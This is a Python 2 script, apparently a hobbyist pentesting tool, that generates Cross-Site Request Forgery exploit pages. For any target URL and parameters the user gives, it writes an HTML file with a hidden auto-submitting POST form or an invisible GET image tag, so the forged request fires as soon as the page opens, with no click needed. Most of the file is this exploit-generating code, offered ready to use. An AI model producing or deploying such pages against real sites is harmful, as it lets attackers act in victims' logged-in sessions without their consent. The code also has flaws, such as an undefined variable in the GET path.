#+----------------------------------------------------------------+
#|   ___ ___ ___ ____________________________________   
#|  / __/ __| _ \   | \/ / | /- \  ||// ___// | |  \\
#| | (__\__ \   /   | || | | |_ |  ||/\ ____  | |---\\
#|  \___|___/_|_\__ \__, __/_|  |__|| \\____\\|_|.  ||
#+----------------------------------------------------------------+
#|     A Simple & Handy Tool | Created by wong Ndeso_goodeyes     +
#+----------------------------------------------------------------+
#
#Information:  This is a tool specially designed for Pentesters  & 
#Security Researchers to help them create Proof Of Concept(POC) of 
#Cross-Site Request Forgery(CSRF) attacks. This tool provides a    
#final exploit for triggering the CSRF attack.                     
#
#Instructions: Go through the program to create the final exploit, 
#once the exploit is created, save it as .html and run it.We added 
#javascript in the end of the exploit so whenever the .html opens  
#the exploit will run automatically(Without user interaction).

import urllib
import Tkinter as tk
root = tk.Tk()

root.overrideredirect(True)
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
root.geometry('%dx%d+%d+%d' % (width*0.8, height*0.8, width*0.1, height*0.1))


image_file = "splash.gif"


image = tk.PhotoImage(file=image_file)
canvas = tk.Canvas(root, height=height*0.8, width=width*0.8, bg="black")
canvas.create_image(width*0.8/2, height*0.8/2, image=image)
canvas.pack()

root.after(5000, root.destroy)
root.mainloop()

print(" +----------------------------------------------------------------+")
print(" |   ___ ___ ___ ____  __      _   _________________          |")
print(" |  / __/ __| _ \        __________ _| |_____ _ _   |")
print(" | | (__\__ \   /         |  \/| / _` | / / -_) '_|  |")
print(" |  \___|___/_|_\         |_|  |_\__,_|_\_\___|_|    |")
print(" +----------------------------------------------------------------+")
print(" | A Simple & Handy Tool | Created by wong Ndeso_godeyes|")
print(" +----------------------------------------------------------------+")
print("")
print(" Information:  This is a tool specially designed for Pentesters  & ")
print(" Security Researchers to help them create Proof Of Concept of ")
print(" Cross-Site Request Forgery(CSRF) attacks. This tool provides a    ")
print(" final exploit for triggering the CSR attack.                     ")
print("")
print(" Instructions: Go through the program to create the final exploit, ")
print(" once the exploit is created, save it as .html and run it.We added ")
print(" javascript in the end of the exploit so whenever the .html opens  ")
print(" the exploit will run automatically(Without user interaction).")
print("")
print ("[+] Select method:") #Printing options for HTTP methods
print ("")
print ("1.POST")
print ("2.GET")
print ("other options will be added soon.")
print ("")
method = str(raw_input("[+] Select 1 or 2 : "))
print ("")
options1 = "1","2"
if method == "1": #POST Method
	print ("")
	action = str(raw_input("[+] Enter 'target' URL: "))
	print("")
	exploittitle = "\n[!] Exploit:"
	formstart = "\t<form action=\"%s\" method=\"POST\" name=\"exploit\">"%(action)
	formend = "\t</form>\n\t<script>document.exploit.submit()</script>"
	
	#The code below asks the parameter values
	num_array = list()
	name_array = list()
	num = raw_input("Enter how many parameters you want to enter? :")
	if num.isdigit():


		print("")
		print ("Enter parameter 'Name' and 'Value': ")
		for i in range(int(num)): #FOR loop for asking Parameter Name and Value.
			print("")
			n = raw_input("Name : ")
			n1 = raw_input("Value: ")
			num_array.append(str(n))
			name_array.append(str(n1))

		print("Enter your Filename,\nNote: The exploit will be saved as 'filename'.html \n")
		extension = ".html"
		name = str(raw_input("Filename: "))
		filename = name+extension
		file = open(filename, "w")

		file.write(formstart)
		file.write("\n")
		print exploittitle
		print formstart
		#FOR loop for printing user entered values in the final exploit.
		for x, y in zip(num_array,name_array):
			name = str(x)
			value = str(y)
			print "\t<input type=\"hidden\" name=\""+name+"\" value=\""+value+"\">"
			finalstring = "\t<input type=\"hidden\" name=\""+name+"\" value=\""+value+"\">\n"
			file.write(finalstring)
		print formend
		file.write(formend)
		file.close()
		print("Your exploit is saved as %s")%filename
		print("")
	else:
		print("Invalid value!") #GET
if method == "2": #GET Method
	action = str(raw_input("[+] Enter 'target' URL(must end with /) e.g, https://www.google.com/: "))
	num = raw_input("Enter how many parameters you want to enter? :")
	if num.isdigit():
		num_array = list()
		name_array = list()
		print("")
		print ("Enter parameter 'Name' and 'Value': ")
		for i in range(int(num)): #FOR loop for asking Parameter Name and Value.
			print("")
			n = raw_input("Name : ")
			n2 = n
			n1 = raw_input("Value: ")
			n3 = n1
			num_array.append(str(n2))
			name_array.append(str(n3))
		finalstring = dict(zip(num_array, name_array))
		urlencoded = urllib.urlencode(finalstring)
	
	
	exploittitle = "\n[!] Exploit:"
	print ("")
	print exploittitle
	print ("\t<img src=\"%s"+"?"+"%s"+"\" style=\"opacity:0\">")%(action, urlencoded)  
	jsonoutput = '''<img src=\"%s?%s\" style=\"opacity:0\">'''%(action, urlencoded)
	print("")
	print("Enter your Filename,\nNote: The exploit will be saved as 'filename'.html \n")
	extension = ".html"
	name = raw_input("Filename: ")
	filename = name+extension
	file = open(filename, "w")

	file.write(jsonoutput)
	file.close()
	print("Your exploit is saved as %s")%filename
	print("")

print ("")
exittheprogram = raw_input("Press Enter to exit.")
exit()
